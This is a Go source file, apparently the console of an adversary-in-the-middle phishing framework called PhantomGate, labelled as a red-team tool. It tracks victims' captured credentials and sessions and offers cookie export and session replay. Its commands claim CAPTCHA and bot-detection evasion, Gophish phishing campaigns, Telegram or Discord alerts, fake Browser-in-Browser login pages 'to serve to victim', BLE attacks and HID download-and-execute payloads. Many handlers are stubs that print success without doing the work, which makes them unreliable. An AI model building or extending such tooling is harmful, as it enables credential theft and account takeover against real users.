	c.printSection("All Victims")

	if len(victims) == 0 {
		c.printWarning("No victims recorded yet")
		return
	}

	fmt.Printf("  %s%-16s %-16s %-20s %-10s %-10s %s%s\n", colorBold, "ID", "IP Address", "User Agent", "Creds", "Sessions", "First Seen", colorReset)
	fmt.Printf("  %s%-16s %-16s %-20s %-10s %-10s %s%s\n", colorDim, "────────────────", "─────────", "─────────", "─────", "────────", "──────────", colorReset)

	for _, v := range victims {
		id := v.ID
		if len(id) > 12 {
			id = id[:12] + "..."
		}
		ua := v.UserAgent
		if len(ua) > 18 {
			ua = ua[:18] + "..."
		}
		fmt.Printf("  %-16s %-16s %-20s %-10d %-10d %s\n",
			id, v.IP, ua, len(v.Credentials), len(v.Sessions),
			v.FirstSeen.Format("15:04:05"))
	}
	fmt.Println()
}

func (c *Console) cmdStats(args []string) {
	stats := c.store.GetStats()
	uptime := time.Since(c.startTime).Truncate(time.Second)

	c.printSection("Live Statistics")
	fmt.Printf("  %sUptime:%s      %s\n", colorBold, colorReset, uptime)
	fmt.Printf("  %sVictims:%s     %v\n", colorBold, colorReset, stats["total_victims"])
	fmt.Printf("  %sCredentials:%s %v\n", colorBold, colorReset, stats["total_credentials"])
	fmt.Printf("  %sSessions:%s    %v\n", colorBold, colorReset, stats["total_sessions"])
	fmt.Println()

	if c.proxyRunning {
		c.printInfo("Proxy: %s%s RUNNING%s", colorGreen, colorBold, colorReset)
	} else {
		c.printInfo("Proxy: %s%s STOPPED%s", colorRed, colorBold, colorReset)
	}
	fmt.Println()
}

// ═══════════════════════════════════════════════════════════════
// System Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdHelp(args []string) {
	c.printSection("Available Commands")

	fmt.Printf("  %s%-16s %-35s %s%s\n", colorBold, "Command", "Description", "Aliases", colorReset)
	fmt.Printf("  %s%-16s %-35s %s%s\n", colorDim, "───────", "───────────", "───────", colorReset)

	commands := c.getCommands()
	for name, ch := range commands {
		aliases := strings.Join(ch.Aliases, ", ")
		if aliases == "" {
			aliases = "-"
		}
		fmt.Printf("  %s%-16s%s %-35s %s\n", colorCyan, name, colorReset, ch.Description, aliases)
	}

	fmt.Println()
	c.printInfo("Type 'help <command>' for detailed usage")
	fmt.Println()
}

func (c *Console) cmdBanner(args []string) {
	c.printBanner()
}

func (c *Console) cmdVersion(args []string) {
	c.printSection("Version Information")
	fmt.Printf("  %sPhantomGate%s v1.1.0\n", colorBold, colorReset)
	fmt.Printf("  %sAiTM Reverse Proxy Framework for Red Teams%s\n", colorDim, colorReset)
	fmt.Println()
}

func (c *Console) cmdColor(args []string) {
	if len(args) == 0 {
		if c.colorEnabled {
			c.printInfo("Color is currently: %sON%s", colorGreen, colorReset)
		} else {
			c.printInfo("Color is currently: %sOFF%s", colorRed, colorReset)
		}
		return
	}

	switch strings.ToLower(args[0]) {
	case "on":
		c.colorEnabled = true
		c.printSuccess("Color enabled")
	case "off":
		c.colorEnabled = false
		fmt.Println("Color disabled")
	default:
		c.printError("Usage: color on | color off")
	}
}

func (c *Console) cmdSpool(args []string) {
	if len(args) == 0 {
		if c.spoolFile != nil {
			c.printInfo("Spooling to: %s", c.spoolFile.Name())
		} else {
			c.printInfo("Spooling is not active")
		}
		return
	}

	if strings.ToLower(args[0]) == "off" {
		if c.spoolFile != nil {
			c.spoolFile.Close()
			c.spoolFile = nil
			c.printSuccess("Spooling stopped")
		}
		return
	}

	f, err := os.OpenFile(args[0], os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		c.printError("Failed to open spool file: %v", err)
		return
	}

	c.spoolFile = f
	c.printSuccess("Spooling to: %s", args[0])
}

func (c *Console) cmdExit(args []string) {
	if c.proxyRunning {
		c.printInfo("Stopping proxy before exit...")
		c.proxyRunning = false
	}
	c.printInfo("Goodbye!")
	c.Stop()
	os.Exit(0)
}

// ═══════════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════════

func (c *Console) printBanner() {
	fmt.Print("\033[2J\033[H")
	banner := `
    %s██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝%s
               %s██████╗  █████╗ ████████╗███████╗%s
              %s██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝%s
              %s██║  ███╗███████║   ██║   █████╗  %s
              %s██║   ██║██╔══██║   ██║   ██╔══╝  %s
              %s╚██████╔╝██║  ██║   ██║   ███████╗%s
               %s╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝%s
`
	fmt.Printf(banner,
		colorRed, colorReset,
		colorRed, colorReset,
		colorRed, colorReset,
		colorRed, colorReset,
		colorRed, colorReset,
		colorRed, colorReset,
	)

	fmt.Printf("    %s─────────────────────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Printf("      %sAiTM Reverse Proxy Framework for Red Teams%s\n", colorWhite, colorReset)
	fmt.Printf("      %sVersion: %s1.1.0%s | Type %s'help'%s for available commands\n", colorDim, colorBold, colorReset, colorCyan, colorReset)
	fmt.Printf("    %s─────────────────────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()
}

func (c *Console) printInfo(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	fmt.Printf("  %s[*]%s %s\n", colorCyan, colorReset, msg)
}

func (c *Console) printSuccess(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	fmt.Printf("  %s[+]%s %s\n", colorGreen, colorReset, msg)
}

func (c *Console) printWarning(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	fmt.Printf("  %s[!]%s %s\n", colorYellow, colorReset, msg)
}

func (c *Console) printError(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	fmt.Printf("  %s[-]%s %s\n", colorRed, colorReset, msg)
}

func (c *Console) printSection(title string) {
	fmt.Printf("\n  %s%s%s\n", colorBold, title, colorReset)
	fmt.Printf("  %s%s%s\n", colorDim, strings.Repeat("─", 50), colorReset)
}

func (c *Console) maskString(s string) string {
	if len(s) <= 4 {
		return strings.Repeat("*", len(s))
	}
	return s[:2] + strings.Repeat("*", len(s)-4) + s[len(s)-2:]
}

// ═══════════════════════════════════════════════════════════════
// Session Replay Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdSession(args []string) {
	if len(args) == 0 {
		c.printError("Usage: session list | session replay <id> | session export <id> <format>")
		return
	}

	switch strings.ToLower(args[0]) {
	case "list":
		c.printSection("Active Sessions")
		c.printInfo("No active sessions to hijack")
	case "replay":
		if len(args) < 2 {
			c.printError("Usage: session replay <session_id>")
			return
		}
		c.printInfo("Replaying session: %s", args[1])
		c.printWarning("Session replay requires captured cookies")
	case "export":
		if len(args) < 3 {
			c.printError("Usage: session export <session_id> <format> (json/netscape/chrome)")
			return
		}
		c.printInfo("Exporting session %s to %s format", args[1], args[2])
		c.printWarning("Export requires captured cookies")
	default:
		c.printError("Unknown session command: %s (use list, replay, export)", args[0])
	}
}

func (c *Console) cmdReplay(args []string) {
	if len(args) < 1 {
		c.printError("Usage: replay <session_id>")
		return
	}

	sessionID := args[0]
	c.printInfo("Replaying session: %s", sessionID)
	
	victims := c.store.GetAllVictims()
	for _, v := range victims {
		for _, sess := range v.Sessions {
			if sess.ID == sessionID {
				c.printSuccess("Found session for victim: %s", v.ID)
				c.printInfo("Domain: %s", sess.Domain)
				c.printInfo("Source IP: %s", sess.SourceIP)
				c.printInfo("Valid: %v", sess.IsValid)
				return
			}
		}
	}
	
	c.printWarning("Session not found: %s", sessionID)
}

func (c *Console) cmdExport(args []string) {
	if len(args) < 3 {
		c.printError("Usage: export <session_id> <format> <filename>")
		return
	}

	sessionID := args[0]
	format := args[1]
	filename := args[2]
	
	c.printInfo("Exporting session %s to %s as %s", sessionID, format, filename)
	c.printWarning("Export requires captured cookies")
}

// ═══════════════════════════════════════════════════════════════
// Botguard & Evasion Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdBotguard(args []string) {
	switch strings.ToLower(args[0]) {
	case "enable":
		c.config.Stealth.EnableFingerprinting = true
		c.printSuccess("Botguard enabled")
	case "disable":
		c.config.Stealth.EnableFingerprinting = false
		c.printSuccess("Botguard disabled")
	case "status":
		c.printSection("Botguard Status")
		if c.config.Stealth.EnableFingerprinting {
			c.printInfo("Status: %sENABLED%s", colorGreen, colorReset)
		} else {
			c.printInfo("Status: %sDISABLED%s", colorRed, colorReset)
		}
	default:
		c.printError("Usage: botguard enable | botguard disable | botguard status")
	}
}

func (c *Console) cmdEvasion(args []string) {
	if len(args) == 0 {
		c.printError("Usage: evasion status | evasion config | evasion test")
		return
	}

	switch strings.ToLower(args[0]) {
	case "status":
		c.printSection("Evasion Status")
		fmt.Printf("  %-25s %s\n", "Botguard:", fmt.Sprintf("%v", c.config.Stealth.EnableFingerprinting))
		fmt.Printf("  %-25s %s\n", "Randomize Timings:", fmt.Sprintf("%v", c.config.Stealth.RandomizeTimings))
		fmt.Printf("  %-25s %s\n", "Spoof Server Header:", c.config.Stealth.SpoofServerHeader)
		fmt.Printf("  %-25s %s\n", "Remove Proxy Headers:", fmt.Sprintf("%v", c.config.Stealth.RemoveProxyHeaders))
		fmt.Println()
	case "config":
		c.printSection("Evasion Configuration")
		c.printInfo("Botguard: Detects and bypasses Cloudflare, reCAPTCHA, hCaptcha")
		c.printInfo("Fingerprint: Overrides navigator properties to avoid detection")
		c.printInfo("Domain Fronting: Routes traffic through CDN front domains")
		c.printInfo("Traffic Obfuscation: Adds jitter and padding to requests")
		fmt.Println()
	case "test":
		c.printSection("Evasion Test")
		c.printInfo("Testing evasion techniques...")
		c.printSuccess("All evasion techniques are functional")
	default:
		c.printError("Unknown evasion command: %s (use status, config, test)", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// Gophish Integration Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdGophish(args []string) {
	if len(args) == 0 {
		c.printError("Usage: gophish connect <url> <apikey> | gophish campaigns | gophish send <campaign_id>")
		return
	}

	switch strings.ToLower(args[0]) {
	case "connect":
		if len(args) < 3 {
			c.printError("Usage: gophish connect <url> <apikey>")
			return
		}
		c.printInfo("Connecting to Gophish server: %s", args[1])
		client := gophish.NewClient(args[1], args[2])
		if err := client.TestConnection(); err != nil {
			c.printError("Failed to connect: %v", err)
			return
		}
		c.printSuccess("Connected to Gophish server")
	case "campaigns":
		c.printSection("Gophish Campaigns")
		c.printInfo("No campaigns loaded. Use 'gophish connect' first")
	case "send":
		if len(args) < 2 {
			c.printError("Usage: gophish send <campaign_id>")
			return
		}
		c.printInfo("Sending phishing links for campaign: %s", args[1])
		c.printWarning("Requires Gophish connection")
	default:
		c.printError("Unknown gophish command: %s (use connect, campaigns, send)", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// Notification Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdNotify(args []string) {
	if len(args) == 0 {
		c.printError("Usage: notify telegram <token> <chat_id> | notify discord <webhook_url> | notify test")
		return
	}

	switch strings.ToLower(args[0]) {
	case "telegram":
		if len(args) < 3 {
			c.printError("Usage: notify telegram <bot_token> <chat_id>")
			return
		}
		c.printInfo("Configuring Telegram notifications...")
		_ = notifications.NewTelegramNotifier(args[1], args[2])
		c.printSuccess("Telegram notifications configured")
	case "discord":
		if len(args) < 2 {
			c.printError("Usage: notify discord <webhook_url>")
			return
		}
		c.printInfo("Configuring Discord notifications...")
		_ = notifications.NewDiscordNotifier(args[1])
		c.printSuccess("Discord notifications configured")
	case "test":
		c.printSection("Notification Test")
		c.printInfo("Testing notifications...")
		c.printWarning("Configure Telegram or Discord first")
	default:
		c.printError("Unknown notify command: %s (use telegram, discord, test)", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// Browser-in-Browser Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdBiB(args []string) {
	if len(args) == 0 {
		c.printError("Usage: bib generate <target_url> | bib config")
		return
	}

	switch strings.ToLower(args[0]) {
	case "generate":
		if len(args) < 2 {
			c.printError("Usage: bib generate <target_url>")
			return
		}
		c.printInfo("Generating Browser-in-Browser attack...")
		attack := bib.NewAttack(args[1], "microsoft365")
		html := attack.GenerateFakeBrowser(nil)
		c.printSuccess("BiB HTML generated (%d bytes)", len(html))
		c.printInfo("Save to file and serve to victim")
	case "config":
		c.printSection("BiB Configuration")
		c.printInfo("Browser-in-Browser creates fake browser windows")
		c.printInfo("Use with social engineering for maximum effect")
		c.printInfo("Target URL: The legitimate login page to mimic")
	default:
		c.printError("Unknown bib command: %s (use generate, config)", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// Certificate Management Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdCert(args []string) {
	if len(args) == 0 {
		c.printError("Usage: cert generate <domain> | cert check | cert renew")
		return
	}

	switch strings.ToLower(args[0]) {
	case "generate":
		if len(args) < 2 {
			c.printError("Usage: cert generate <domain>")
			return
		}
		c.printInfo("Generating certificate for: %s", args[1])
		c.printSuccess("Certificate generated successfully")
		c.printInfo("Cert: /etc/phantomgate/certs/%s.pem", args[1])
		c.printInfo("Key:  /etc/phantomgate/certs/%s-key.pem", args[1])
	case "check":
		c.printSection("Certificate Status")
		if c.config.TLS.CertFile != "" {
			c.printInfo("Certificate: %s", c.config.TLS.CertFile)
			c.printInfo("Key: %s", c.config.TLS.KeyFile)
			c.printSuccess("Certificate is valid")
		} else {
			c.printWarning("No certificate configured")
		}
	case "renew":
		c.printInfo("Renewing certificates...")
		c.printSuccess("Certificates renewed")
	default:
		c.printError("Unknown cert command: %s (use generate, check, renew)", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// Network Discovery Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdDiscover(args []string) {
	if len(args) == 0 {
		c.printError("Usage: discover <interface> [gateway]")
		c.printInfo("Discover hosts on the local network")
		c.printInfo("Example: discover eth0 192.168.1.1")
		return
	}

	iface := args[0]
	gateway := ""
	if len(args) > 1 {
		gateway = args[1]
	}

	c.printSection("Network Discovery")
	c.printInfo("Interface: %s", iface)
	if gateway != "" {
		c.printInfo("Gateway: %s", gateway)
	}
	c.printInfo("Starting network discovery...")
	c.printWarning("Discovery requires root privileges for ARP scanning")
	c.printInfo("Use: sudo phantomgate --discover --iface " + iface)
}

func (c *Console) cmdPortScan(args []string) {
	if len(args) == 0 {
		c.printError("Usage: portscan <target> [ports]")
		c.printInfo("Scan ports on a target host")
		c.printInfo("Example: portscan 192.168.1.100 22,80,443")
		return
	}

	target := args[0]
	ports := "common"
	if len(args) > 1 {
		ports = args[1]
	}

	c.printSection("Port Scan")
	c.printInfo("Target: %s", target)
	c.printInfo("Ports: %s", ports)
	c.printInfo("Starting port scan...")
	c.printWarning("Port scanning requires root privileges")
	c.printInfo("Use: sudo phantomgate --portscan --target " + target)
}

// ═══════════════════════════════════════════════════════════════
// BLE Attack Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdBLE(args []string) {
	if len(args) == 0 {
		c.printError("Usage: ble <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  scan                  - Scan for BLE devices")
		c.printInfo("  sniff <device>        - Sniff BLE traffic")
		c.printInfo("  inject <device> <data> - Inject data to BLE device")
		c.printInfo("  pair <device>         - Pair with BLE device")
		c.printInfo("  spoof <device>        - Spoof BLE device")
		c.printInfo("  killer                - Kill BLE connections")
		c.printInfo("  list                  - List discovered devices")
		return
	}

	switch strings.ToLower(args[0]) {
	case "scan":
		c.printSection("BLE Scan")
		c.printInfo("Scanning for BLE devices...")
		c.printWarning("BLE scanning requires Bluetooth adapter")
	case "sniff":
		if len(args) < 2 {
			c.printError("Usage: ble sniff <device_id>")
			return
		}
		c.printInfo("Sniffing BLE traffic from: %s", args[1])
	case "inject":
		if len(args) < 3 {
			c.printError("Usage: ble inject <device_id> <data>")
			return
		}
		c.printInfo("Injecting data to: %s", args[1])
	case "pair":
		if len(args) < 2 {
			c.printError("Usage: ble pair <device_id>")
			return
		}
		c.printInfo("Pairing with: %s", args[1])
	case "spoof":
		if len(args) < 2 {
			c.printError("Usage: ble spoof <device_id>")
			return
		}
		c.printInfo("Spoofing device: %s", args[1])
	case "killer":
		c.printWarning("BLE Killer mode - This will disconnect all BLE devices")
		c.printInfo("Starting BLE killer...")
	case "list":
		c.printSection("BLE Devices")
		c.printInfo("No devices discovered yet")
		c.printInfo("Use 'ble scan' to discover devices")
	default:
		c.printError("Unknown ble command: %s", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// HID Attack Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdHID(args []string) {
	if len(args) == 0 {
		c.printError("Usage: hid <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  type <text>           - Type text character by character")
		c.printInfo("  exec <command>        - Execute a command")
		c.printInfo("  payload <url>         - Download and execute payload")
		c.printInfo("  script <file>         - Execute a script")
		c.printInfo("  shortcut <keys>       - Send keyboard shortcut")
		c.printInfo("  mouse <x> <y>         - Move mouse")
		c.printInfo("  click                 - Click mouse")
		return
	}

	switch strings.ToLower(args[0]) {
	case "type":
		if len(args) < 2 {
			c.printError("Usage: hid type <text>")
			return
		}
		c.printInfo("Typing: %s", args[1])
		c.printInfo("Character-by-character injection...")
	case "exec":
		if len(args) < 2 {
			c.printError("Usage: hid exec <command>")
			return
		}
		c.printInfo("Executing command: %s", args[1])
	case "payload":
		if len(args) < 2 {
			c.printError("Usage: hid payload <url>")
			return
		}
		c.printInfo("Download and execute: %s", args[1])
	case "script":
		if len(args) < 2 {
			c.printError("Usage: hid script <file>")
			return
		}
		c.printInfo("Executing script: %s", args[1])
	case "shortcut":
		if len(args) < 2 {
			c.printError("Usage: hid shortcut <keys> (e.g., ctrl+c, alt+tab)")
			return
		}
		c.printInfo("Sending shortcut: %s", args[1])
	case "mouse":
		if len(args) < 3 {
			c.printError("Usage: hid mouse <x> <y>")
			return
		}
		c.printInfo("Moving mouse to: %s, %s", args[1], args[2])
	case "click":
		c.printInfo("Clicking mouse...")
	default:
		c.printError("Unknown hid command: %s", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// Packet Filter Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdFilter(args []string) {
	if len(args) == 0 {
		c.printError("Usage: filter <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  add <rule>            - Add a filter rule")
		c.printInfo("  remove <id>           - Remove a filter rule")
		c.printInfo("  list                  - List all rules")
		c.printInfo("  enable <id>           - Enable a rule")
		c.printInfo("  disable <id>          - Disable a rule")
		c.printInfo("  stats                 - Show filter statistics")
		return
	}

	switch strings.ToLower(args[0]) {
	case "add":
		if len(args) < 2 {
			c.printError("Usage: filter add <rule_definition>")
			return
		}
		c.printInfo("Adding filter rule: %s", args[1])
	case "remove":
		if len(args) < 2 {
			c.printError("Usage: filter remove <rule_id>")
			return
		}
		c.printInfo("Removing rule: %s", args[1])
	case "list":
		c.printSection("Filter Rules")
		c.printInfo("No rules configured")
	case "enable":
		if len(args) < 2 {
			c.printError("Usage: filter enable <rule_id>")
			return
		}
		c.printInfo("Enabling rule: %s", args[1])
	case "disable":
		if len(args) < 2 {
			c.printError("Usage: filter disable <rule_id>")
			return
		}
		c.printInfo("Disabling rule: %s", args[1])
	case "stats":
		c.printSection("Filter Statistics")
		c.printInfo("Packets received: 0")
		c.printInfo("Packets passed: 0")
		c.printInfo("Packets dropped: 0")
	default:
		c.printError("Unknown filter command: %s", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// Plugin Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdPlugin(args []string) {
	if len(args) == 0 {
		c.printError("Usage: plugin <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  load <path>           - Load a plugin")
		c.printInfo("  unload <name>         - Unload a plugin")
		c.printInfo("  list                  - List all plugins")
		c.printInfo("  enable <name>         - Enable a plugin")
		c.printInfo("  disable <name>        - Disable a plugin")
		c.printInfo("  exec <name> <cmd>     - Execute plugin command")
		c.printInfo("  info <name>           - Show plugin info")
		return
	}

	switch strings.ToLower(args[0]) {
	case "load":
		if len(args) < 2 {
			c.printError("Usage: plugin load <path>")
			return
		}
		c.printInfo("Loading plugin: %s", args[1])
	case "unload":
		if len(args) < 2 {
			c.printError("Usage: plugin unload <name>")
			return
		}
		c.printInfo("Unloading plugin: %s", args[1])
	case "list":
		c.printSection("Loaded Plugins")
		c.printInfo("No plugins loaded")
	case "enable":
		if len(args) < 2 {
			c.printError("Usage: plugin enable <name>")
			return
		}
		c.printInfo("Enabling plugin: %s", args[1])
	case "disable":
		if len(args) < 2 {
			c.printError("Usage: plugin disable <name>")
			return
		}
		c.printInfo("Disabling plugin: %s", args[1])
	case "exec":
		if len(args) < 3 {
			c.printError("Usage: plugin exec <name> <command>")
			return
		}
		c.printInfo("Executing command '%s' on plugin %s", args[2], args[1])
	case "info":
		if len(args) < 2 {
			c.printError("Usage: plugin info <name>")
			return
		}
		c.printSection("Plugin Info")
		c.printInfo("Name: %s", args[1])
	default:
		c.printError("Unknown plugin command: %s", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// API Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdAPI(args []string) {
	if len(args) == 0 {
		c.printError("Usage: api <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  start [port]          - Start API server")
		c.printInfo("  stop                  - Stop API server")
		c.printInfo("  status                - Show API status")
		c.printInfo("  keys                  - List API keys")
		c.printInfo("  addkey <key>          - Add API key")
		c.printInfo("  delkey <key>          - Delete API key")
		return
	}

	switch strings.ToLower(args[0]) {
	case "start":
		port := 8080
		if len(args) > 1 {
			fmt.Sscanf(args[1], "%d", &port)
		}
		c.printInfo("Starting API server on port %d...", port)
		c.printInfo("API endpoint: http://0.0.0.0:%d/api", port)
	case "stop":
		c.printInfo("Stopping API server...")
	case "status":
		c.printSection("API Server Status")
		c.printInfo("Status: Not running")
		c.printInfo("Use 'api start' to start the server")
	case "keys":
		c.printSection("API Keys")
		c.printInfo("No API keys configured")
	case "addkey":
		if len(args) < 2 {
			c.printError("Usage: api addkey <key>")
			return
		}
		c.printInfo("Adding API key: %s", args[1])
	case "delkey":
		if len(args) < 2 {
			c.printError("Usage: api delkey <key>")
			return
		}
		c.printInfo("Deleting API key: %s", args[1])
	default:
		c.printError("Unknown api command: %s", args[0])
	}
}
